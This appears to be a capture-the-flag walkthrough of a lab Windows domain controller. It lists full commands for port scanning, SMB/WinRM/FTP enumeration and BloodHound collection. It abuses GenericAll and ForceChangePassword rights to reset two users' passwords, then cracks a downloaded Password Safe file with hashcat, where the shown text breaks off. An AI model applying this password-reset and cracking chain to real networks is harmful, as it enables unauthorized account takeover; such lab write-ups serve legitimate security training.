Target : 10.129.12.40

Date : 03/06/2026

Machine Information :
"As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich"

```bash
>  echo "10.129.12.40 administrator.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.12.40 administrator.htb  
>  nmap -sC -sV -Pn -O -p- --min-rate=2500 10.129.12.40  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-03 17:48 +0200  
Warning: 10.129.12.40 giving up on port because retransmission cap hit (10).  
Nmap scan report for administrator.htb (10.129.12.40)  
Host is up (0.057s latency).  
Not shown: 65510 closed tcp ports (reset)  
PORT      STATE SERVICE       VERSION  
21/tcp    open  ftp           Microsoft ftpd  
| ftp-syst:    
|_  SYST: Windows_NT  
53/tcp    open  domain        Simple DNS Plus  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-03 22:49:17Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-title: Not Found  
|_http-server-header: Microsoft-HTTPAPI/2.0  
9389/tcp  open  mc-nmf        .NET Message Framing  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49664/tcp open  msrpc         Microsoft Windows RPC  
49665/tcp open  msrpc         Microsoft Windows RPC  
49666/tcp open  msrpc         Microsoft Windows RPC  
49667/tcp open  msrpc         Microsoft Windows RPC  
49668/tcp open  msrpc         Microsoft Windows RPC  
50251/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
50256/tcp open  msrpc         Microsoft Windows RPC  
50259/tcp open  msrpc         Microsoft Windows RPC  
50276/tcp open  msrpc         Microsoft Windows RPC  
63001/tcp open  msrpc         Microsoft Windows RPC  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.99%E=4%D=6/3%OT=21%CT=1%CU=38425%PV=Y%DS=2%DC=I%G=Y%TM=6A204D44  
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A  
OS:)SEQ(SP=105%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=  
OS:10A%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FC%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=S  
OS:%TS=A)OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O  
OS:5=M552NW8ST11%O6=M552ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6  
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O  
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=  
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%  
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G  
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)  
  
Network Distance: 2 hops  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
|_clock-skew: 7h00m03s  
| smb2-time:    
|   date: 2026-06-03T22:50:23  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 139.60 seconds
```

This looks like an Active Directory Windows box, with some tweaks : ports `88/tcp` (Kerberos), `389/tcp & 3268/tcp` (LDAP Active Directory), `135/tcp` (RPC), `139/tcp` (NetBIOS) and `445/tcp` (smb2 3.1.1) are open as well as `21/tcp` (ftp), `53/tcp` (DNS), and some Microsoft over HTTP ports as well.

It's not often that we see the ftp port open.

```bash
>  ftp 10.129.12.40  
Connected to 10.129.12.40.  
220 Microsoft FTP Service  
Name (10.129.12.40:vagabond): Olivia  
331 Password required  
Password:    
530 User cannot log in, home directory inaccessible.  
ftp: Login failed.
```

Looks like the base `Olivia:ichliebedich` can't get into FTP. Then, we'll try NetExec :

```bash
>  nxc smb 10.129.12.40 -u Olivia -p 'ichliebedich' --shares --users --groups  
SMB         10.129.12.40    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.12.40    445    DC               [+] administrator.htb\Olivia:ichliebedich    
SMB         10.129.12.40    445    DC               [*] Enumerated shares  
SMB         10.129.12.40    445    DC               Share           Permissions     Remark  
SMB         10.129.12.40    445    DC               -----           -----------     ------  
SMB         10.129.12.40    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.12.40    445    DC               C$                              Default share  
SMB         10.129.12.40    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.12.40    445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.12.40    445    DC               SYSVOL          READ            Logon server share    
SMB         10.129.12.40    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                                  
SMB         10.129.12.40    445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain    
SMB         10.129.12.40    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain    
SMB         10.129.12.40    445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account    
SMB         10.129.12.40    445    DC               olivia                        2024-10-06 01:22:48 0           
SMB         10.129.12.40    445    DC               michael                       2024-10-06 01:33:37 0           
SMB         10.129.12.40    445    DC               benjamin                      2024-10-06 01:34:56 0           
SMB         10.129.12.40    445    DC               emily                         2024-10-30 23:40:02 0           
SMB         10.129.12.40    445    DC               ethan                         2024-10-12 20:52:14 0           
SMB         10.129.12.40    445    DC               alexander                     2024-10-31 00:18:04 0           
SMB         10.129.12.40    445    DC               emma                          2024-10-31 00:18:35 0           
SMB         10.129.12.40    445    DC               [*] Enumerated 10 local users: ADMINISTRATOR  
SMB         10.129.12.40    445    DC               [-] [REMOVED] Arg moved to the ldap protocol

>  nxc winrm 10.129.12.40 -u Olivia -p 'ichliebedich'  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```

So we have direct access to a WinRM shell as well as `READ` on `SYSVOL` and `NETLOGON`.

We'll start with the shell :

```PowerShell
>  evil-winrm -i 10.129.12.40 -u Olivia -p 'ichliebedich'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami  
administrator\olivia  
*Evil-WinRM* PS C:\Users\olivia\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

*Evil-WinRM* PS C:\Users\olivia\Documents> cd C:\Users\  
*Evil-WinRM* PS C:\Users> dir  
  
  
   Directory: C:\Users  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----        10/22/2024  11:46 AM                Administrator  
d-----        10/30/2024   2:25 PM                emily  
d-----          6/3/2026   4:05 PM                olivia  
d-r---         10/4/2024  10:08 AM                Public  
  
  
*Evil-WinRM* PS C:\Users> cd C:\Users\olivia\Desktop  
*Evil-WinRM* PS C:\Users\olivia\Desktop> dir
*Evil-WinRM* PS C:\> cd C:\Users\Public  
*Evil-WinRM* PS C:\Users\Public> dir  
Access to the path 'C:\Users\Public' is denied.  
At line:1 char:1  
+ dir  
+ ~~~  
   + CategoryInfo          : PermissionDenied: (C:\Users\Public:String) [Get-ChildItem], UnauthorizedAccessException  
   + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

No user flag here, that's obvious, and we appear to not be able to do much inside the shell.

```bash
>  smbclient //10.129.12.40/SYSVOL -U Olivia%ichliebedich  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Fri Oct  4 21:48:08 2024  
 ..                                  D        0  Fri Oct  4 21:48:08 2024  
 administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024  
  
               5606911 blocks of size 4096. 1232523 blocks available  
smb: \> cd administrator.htb  
smb: \administrator.htb\> ls  
 .                                   D        0  Fri Oct  4 21:54:15 2024  
 ..                                  D        0  Fri Oct  4 21:48:08 2024  
 DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024  
 Policies                            D        0  Fri Oct  4 21:48:32 2024  
 scripts                             D        0  Fri Oct  4 21:48:08 2024  
  
               5606911 blocks of size 4096. 1236270 blocks available  
smb: \administrator.htb\> ls scripts  
 scripts                             D        0  Fri Oct  4 21:48:08 2024  
  
               5606911 blocks of size 4096. 1236498 blocks available  
smb: \administrator.htb\> cd scripts  
smb: \administrator.htb\scripts\> ls  
 .                                   D        0  Fri Oct  4 21:48:08 2024  
 ..                                  D        0  Fri Oct  4 21:54:15 2024  
  
               5606911 blocks of size 4096. 1239434 blocks available  
smb: \administrator.htb\scripts\> cd /administrator.htb/Policies  
smb: \administrator.htb\Policies\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:54:15 2024  
 {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Fri Oct  4 21:48:32 2024  
 {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 1244309 blocks available  
smb: \administrator.htb\Policies\> cd ^C  
>  smbclient //10.129.12.40/SYSVOL -U Olivia%ichliebedich  
Try "help" to get a list of possible commands.  
smb: \> cd administrator.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
 GPT.INI                             A       23  Wed Oct 30 22:22:19 2024  
 MACHINE                             D        0  Sat Oct  5 19:34:47 2024  
 USER                                D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 1250753 blocks available  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd USER  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 1252250 blocks available  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\> ls -al  
NT_STATUS_NO_SUCH_FILE listing \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\-al  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER\> exit  
>  smbclient //10.129.12.40/SYSVOL -U Olivia%ichliebedich  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Fri Oct  4 21:48:08 2024  
 ..                                  D        0  Fri Oct  4 21:48:08 2024  
 administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024  
  
               5606911 blocks of size 4096. 1259198 blocks available  
smb: \> cd administrator.htb  
smb: \administrator.htb\> ls  
 .                                   D        0  Fri Oct  4 21:54:15 2024  
 ..                                  D        0  Fri Oct  4 21:48:08 2024  
 DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024  
 Policies                            D        0  Fri Oct  4 21:48:32 2024  
 scripts                             D        0  Fri Oct  4 21:48:08 2024  
  
               5606911 blocks of size 4096. 1260803 blocks available  
smb: \administrator.htb\> cd Policies  
smb: \administrator.htb\Policies\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:54:15 2024  
 {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Fri Oct  4 21:48:32 2024  
 {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 1262563 blocks available  
smb: \administrator.htb\Policies\> cd {31B2F340-016D-11D2-945F-00C04FB984F9}  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
 GPT.INI                             A       23  Wed Oct 30 22:22:19 2024  
 MACHINE                             D        0  Sat Oct  5 19:34:47 2024  
 USER                                D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 1264959 blocks available  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> get GPT.INI  
getting file \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\> cd /administrator.htb/Policies/  
smb: \administrator.htb\Policies\> cd {6AC1786C-016F-11D2-945F-00C04fB984F9}  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
 GPT.INI                             A       22  Thu Oct 31 00:56:19 2024  
 MACHINE                             D        0  Thu Oct 31 00:56:19 2024  
 USER                                D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 1273737 blocks available  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\> cd MACHINE  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> ls  
 .                                   D        0  Thu Oct 31 00:56:19 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
 comment.cmtx                        A      553  Thu Oct 31 00:56:19 2024  
 Microsoft                           D        0  Fri Oct  4 21:48:32 2024  
 Registry.pol                        A      184  Thu Oct 31 00:56:19 2024  
 Scripts                             D        0  Wed Oct 30 22:22:32 2024  
  
               5606911 blocks of size 4096. 1961904 blocks available  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> get Registry.pol*  
NT_STATUS_OBJECT_NAME_INVALID opening remote file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Registry.pol*  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> get Registry.pol  
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Registry.pol of size 184 as Registry.pol (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> get comment.cmtx  
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\comment.cmtx of size 553 as comment.cmtx (1.3 KiloBytes/sec) (average 0.6 KiloBytes/sec)  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\> cd Microsoft  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Thu Oct 31 00:56:19 2024  
 Windows NT                          D        0  Fri Oct  4 21:48:32 2024  
  
               5606911 blocks of size 4096. 2068391 blocks available  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> cd Windows NT  
cd \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows\: NT_STATUS_OBJECT_NAME_NOT_FOUND  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\> cd "Windows NT"  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\> ls  
 .                                   D        0  Fri Oct  4 21:48:32 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
 SecEdit                             D        0  Wed Oct 30 22:22:53 2024  
  
               5606911 blocks of size 4096. 2068391 blocks available  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\> cd SecEdit  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> ls  
 .                                   D        0  Wed Oct 30 22:22:53 2024  
 ..                                  D        0  Fri Oct  4 21:48:32 2024  
 GptTmpl.inf                         A     4262  Wed Oct 30 22:22:53 2024  
  
               5606911 blocks of size 4096. 2068135 blocks available  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> get GptTmpl.inf  
getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 4262 as GptTmpl.inf (9.8 KiloBytes/sec) (average 3.0 KiloBytes/sec)  
smb: \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> quit
```

We grabbed some files but so far it's a dead end. We'll add the domain control to the hosts so we can try bloodhound.

```bash
>  echo "10.129.12.40 dc.administrator.htb administrator.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.12.40 dc.administrator.htb administrator.htb
```

We try to get the data for bloodhound from Olivia :

```bash
>  bloodhound-python -d administrator.htb -c All -u olivia -p 'ichliebedich' -ns 10.129.12.40 --zip  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: administrator.htb  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc.administrator.htb  
INFO: Found 11 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: dc.administrator.htb  
INFO: Done in 00M 28S  
INFO: Compressing output into 20260603181735_bloodhound.zip
```

We got everything we could, now we open `bloodhound` and upload the database.

We see that Olivia only has 1 `Outbound Object Control` and it's on user `michael`.
We have `GenericAll` which means we have all rights on `michael` as Olivia.

That means we can change his password with RPC.

```PowerShell
>  net rpc password "michael" "Scrow123&" -U "administrator.htb"/"Olivia%ichliebedich" -S 10.129.12.40  
>  nxc winrm 10.129.12.40 -u michael -p 'Scrow123&'  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [+] administrator.htb\michael:Scrow123& (Pwn3d!)

>  evil-winrm -i 10.129.12.40 -u michael -p 'Scrow123&'  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\michael\Documents> cd C:/Users/  
*Evil-WinRM* PS C:\Users> dir  
  
  
   Directory: C:\Users  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-----        10/22/2024  11:46 AM                Administrator  
d-----        10/30/2024   2:25 PM                emily  
d-----          6/3/2026   4:26 PM                michael  
d-----          6/3/2026   4:05 PM                olivia  
d-r---         10/4/2024  10:08 AM                Public  
  
  
*Evil-WinRM* PS C:\Users> cd michael/Desktop  
*Evil-WinRM* PS C:\Users\michael\Desktop> dir
*Evil-WinRM* PS C:\Users\michael\Desktop> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

So we still don't have the user flag, but now we own michael.

We'll look at his shares on SMB and his rights on `bloodhound` :

```bash
>  nxc smb 10.129.12.40 -u michael -p 'Scrow123&' --shares  
SMB         10.129.12.40    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.12.40    445    DC               [+] administrator.htb\michael:Scrow123&    
SMB         10.129.12.40    445    DC               [*] Enumerated shares  
SMB         10.129.12.40    445    DC               Share           Permissions     Remark  
SMB         10.129.12.40    445    DC               -----           -----------     ------  
SMB         10.129.12.40    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.12.40    445    DC               C$                              Default share  
SMB         10.129.12.40    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.12.40    445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.12.40    445    DC               SYSVOL          READ       
	     Logon server share
```

Same smb rights as Olivia, luckily for us, we have a `ForceChangePassword` on `benjamin` as `michael`.

```bash
>  net rpc password "benjamin" "Scrow123&" -U "administrator.htb"/"michael%Scrow123&" -S 10.129.12.40  
>  nxc winrm 10.129.12.40 -u benjamin -p 'Scrow123&'  
WINRM       10.129.12.40    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)    
WINRM       10.129.12.40    5985   DC               [-] administrator.htb\benjamin:Scrow123&
>  nxc smb 10.129.12.40 -u benjamin -p 'Scrow123&' --shares  
SMB         10.129.12.40    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.12.40    445    DC               [+] administrator.htb\benjamin:Scrow123&    
SMB         10.129.12.40    445    DC               [*] Enumerated shares  
SMB         10.129.12.40    445    DC               Share           Permissions     Remark  
SMB         10.129.12.40    445    DC               -----           -----------     ------  
SMB         10.129.12.40    445    DC               ADMIN$                          Remote Admin  
SMB         10.129.12.40    445    DC               C$                              Default share  
SMB         10.129.12.40    445    DC               IPC$            READ            Remote IPC  
SMB         10.129.12.40    445    DC               NETLOGON        READ            Logon server share    
SMB         10.129.12.40    445    DC               SYSVOL          READ            Logon server share
```

So, no shell but same shares.

We forgot to netexec ftp the two users we got :

```bash
>  nxc ftp 10.129.12.40 -u benjamin -p 'Scrow123&'  
FTP         10.129.12.40    21     10.129.12.40     [+] benjamin:Scrow123&  
>  nxc ftp 10.129.12.40 -u michael -p 'Scrow123&'  
FTP         10.129.12.40    21     10.129.12.40     [-] michael:Scrow123& (Response:530 User cannot log in, home directory inaccessible.)
```

So it seems `benjamin` can access the File Transfer Protocol.

```bash
>  ftp benjamin@10.129.12.40  
Connected to 10.129.12.40.  
220 Microsoft FTP Service  
331 Password required  
Password:    
230 User logged in.  
Remote system type is Windows_NT.  
ftp> ls  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
10-05-24  09:13AM                  952 Backup.psafe3  
226 Transfer complete.  
ftp> get Backup.psafe3  
200 PORT command successful.  
125 Data connection already open; Transfer starting.  
WARNING! 3 bare linefeeds received in ASCII mode  
File may not have transferred correctly.  
226 Transfer complete.  
952 bytes received in 0.0517 seconds (17.9834 kbytes/s)  
ftp> quit  
221 Goodbye.
```

We got a backup file, but it's not a .ps1 PowerShell file nor a .hc file that we can mount and decrypt like a VeraCrypt mount.

It's a simple `passwordsafe v3` password, its hashcat mode is `5200`.

So we try to decode it first with rules :

```bash
>  hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/doc/hashcat/rules/best66.rule  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 66  
  
Optimizers applied:  
* Zero-Byte  
* Single-Hash  
* Single-Salt  
* Slow-Hash-SIMD-LOOP  
  
ATTENTION! Potfile storage is disabled for this hash mode.  
Passwords cracked during this session will NOT be stored to the potfile.  
Consider using -o to save cracked passwords.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (12417 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 946729344  
  
Cracking performance lower than expected?                    
  
* Append -w 3 to the commandline.  
 This can cause your screen to lag.  
  
* Append -S to the commandline.  
 This has a drastic speed impact but can be better for specific attacks.  
 Typical scenarios are a small wordlist but a large ruleset.  
  
* Update your backend API runtime / driver the right way:  
 https://hashcat.net/faq/wrongdriver  
  
* Create more work items to make use of your parallelization power:  
 https://hashcat.net/faq/morework  
  
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s  
  
Session..........: hashcat  
Status...........: Running  
Hash.Mode........: 5200 (Password Safe v3)  
Hash.Target......: Backup.psafe3  
Time.Started.....: Wed Jun  3 18:41:51 2026 (43 secs)  
Time.Estimated...: Sat Jun  6 01:51:55 2026 (2 days, 7 hours)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Mod........: Rules (/usr/share/doc/hashcat/rules/best66.rule)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:     4767 H/s (9.51ms) @ Accel:20 Loops:1024 Thr:1 Vec:8  
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)  
Progress.........: 206560/946729344 (0.02%)  
Rejected.........: 0/206560 (0.00%)  
Restore.Point....: 3040/14344384 (0.02%)  
Restore.Sub.#01..: Salt:0 Amplifier:37-38 Iteration:2048-2049  
Candidate.Engine.: Device Generator  
